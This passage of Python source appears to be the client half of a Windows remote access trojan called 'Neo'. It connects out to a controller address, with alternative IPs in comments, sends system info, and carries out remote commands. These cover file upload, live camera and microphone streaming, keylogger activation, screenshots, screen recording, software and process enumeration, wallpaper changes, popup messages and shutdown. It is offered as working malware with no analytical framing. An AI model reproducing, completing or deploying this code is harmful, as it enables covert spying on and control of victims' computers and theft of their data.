            else ctypes.windll.user32.SystemParametersInfoA


    def change_wallpaper():
        sys_parameters_info = get_sys_parameters_info()
        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)

        # When the SPI_SETDESKWALLPAPER flag is used,
        # SystemParametersInfo returns TRUE
        # unless there is an error (like when the specified file doesn't exist).
        if not r:
            print(ctypes.WinError())


    change_wallpaper()
    print("changed")


def Uploade():
    con.send(b'1')
    while True:
        #print("1")
        filefamily = con.recv(2042)
        sfilefamily=str(filefamily.decode("utf-8"))
        if sfilefamily=='ex()':
            con.send(b'1')
            break
        con.send(b'1')
        filetype = con.recv(2042)
        con.send(b'1')
        sfiletype=str(filetype.decode(errors='ignore'))
        if sfiletype=='ex()':
            con.send(b'1')
            break
        try:
            file = open(sfilefamily+sfiletype,'wb')
        except:
            pass
       # print("done")
        data = con.recv(2048)
        while data :
            #print('1')
            con.send(b'1')
           # print('2')
            file.write(data)
           # print('3')
            data = con.recv(2048)
           # print('4')
            if '0hibye1' in str(data.decode(errors='ignore')):
                str(data).replace('0hibye1','')
                file.write(data)
                break
            else:
                pass
        #print("end")
        file.close()
        con.send(b'end')
       # print('p0')
        bagain = con.recv(24)
       # print('p1')
        again = str(bagain.decode("utf-8"))
        if again=='y':
            con.send(b'1')
            continue
        elif again=='0':
            con.send(b'1')
            break
        else:
            con.send(b'1')
            break

def Voice_Recorder_online_TP():
    RATE = 44100
    data = b""
    payload_size = struct.calcsize("Q")
    while True :
        while len(data) < payload_size :
                packet = con.recv(4*1024)
                if not packet : break
                data +=packet
        packed_msg_size= data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q",packed_msg_size)[0]
        while len(data) < msg_size :
                data += con.recv(4*1024)
        framedata = data[:msg_size]
        data = data[msg_size:]
        frame = pickle.loads(framedata)
        scipy.io.wavfile.write("recvoic.wav",RATE,frame)
        playsound.playsound('recvoic.wav')
        print("1")

def Voice_Recorder_file_TP():
  file = open('rec.wav','wb')
  data = con.recv(2048)
  while data :
    file.write(data)
    data = con.recv(2048)  
  file.close()
  song = AudioSegment.from_wav("rec.wav")
  play(song)
  os.remove("rec.wav")

def Record_Camera_TP():
  data = b""
  payload_size = struct.calcsize("Q")
  while True :
      while len(data) < payload_size :
          packet = con.recv(4*1024)
          if not packet : break
          data +=packet
      packed_msg_size= data[:payload_size]
      data = data[payload_size:]
      msg_size = struct.unpack("Q",packed_msg_size)[0]
      while len(data) < msg_size :
          data += con.recv(4*1024)
      framedata = data[:msg_size]
      data = data[msg_size:]
      frame = pickle.loads(framedata)
      cv2.imshow("neo",frame)
      if cv2.waitKey(1) & 0xFF == ord('q'):
          break

def wmic():
    try:
        shell = subprocess.check_output("wmic product get name",shell=True)
        value=str(shell.decode(errors='ignore'))
        value2=bytes(value,'utf-8')
        con.send(value2) 
    except:
        con.send(b'somthing is wrong...')

def tasklist():
    try :
        shell = subprocess.check_output("tasklist",shell=True)
        value=str(shell.decode("utf-8"))
        value2=bytes(value,'utf-8')
        con.send(value2) 
    except :
        con.send(b'somthing is wrong...')

def massage():
    text = con.recv(444444)
    strtext = str(text.decode("utf-8"))
    warning = "MsgBox "+'"'+strtext+'"'
    f = open("warn.vbs","w")
    f.writelines(warning)
    f.close
    subprocess.Popen("warn.vbs",shell=True,stderr=subprocess.STDOUT)
    #os.system("warn.vbs")

#---------------------------------------------start--------------------------------
while True:
    print("Welcom To The Neo")
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Pls Wait . .  ")
    #192.168.215.195
    #192.168.121.195
    #192.168.43.116
    #192.168.238.1
    #185.231.112.68
    while True :             
        IP = "127.0.0.1"
        PORT = 2334	  
        try :
                con.connect((IP,PORT))
                break
        except :            	                 
                continue
            
    
    print("connected successfully")
    device = platform.platform()
    info = str(device)
    info2= bytes(info,'utf_8')
    con.sendall(info2)
    try :
        while True:
            print("Active")
            op1 = con.recv(1024)
            op = str(op1.decode("utf-8"))
            if op == 'Restart':
                Restart()
            elif op == "shutdown":
                Shutdown()
            elif op == 'Voice':
                Play_Voice()
            elif op == 'Wifi':
                Wifi_Info()
            elif op == 'Drive':
                Drive()
            elif op == 'logoff':
                Logoff()
            elif op == 'Info':
                More_Info()
            elif op == 'ScreenShout':
                screenshout()
            elif op=='Capture_Camera':
                Capture_Camera()
            elif op=='Record_Camera':
                Record_Camera()
            elif op=='Record_Camera_TP':
                Record_Camera_TP()
            elif op=='Change_Background':
                Change_Background()
            elif op=='Screen_Recorder':
                Screen_Recorder()
            elif op=='Screen_Recorder_TP':
                Screen_Recorder_TP()
            elif op=='Voice_Recorder_online':
                Voice_Recorder_online()
            elif op=='Voice_Recorder_online_TP':
                Voice_Recorder_online_TP()
            elif op=='Voice_Recorder_file':
                Voice_Recorder_file()
            elif op=='Voice_Recorder_file_TP':
                Voice_Recorder_file_TP()
            elif op=='Active_KeyLogger':
                Active_KeyLogger()
            elif op=='OS':
                osing()
            elif op=='Download':
                Download()
            elif op=='Uploade':
                Uploade()
            elif op=='wmic':
                wmic()
            elif op=='tasklist':
                tasklist()
            elif op=='massage':
                massage()
            elif op=='0':
                con.send(b'1')
                continue
            elif op=='exit':
                break
            elif op=='0hibye1':
                continue
            else:
                break
        print("exited")
    except:
        continue
    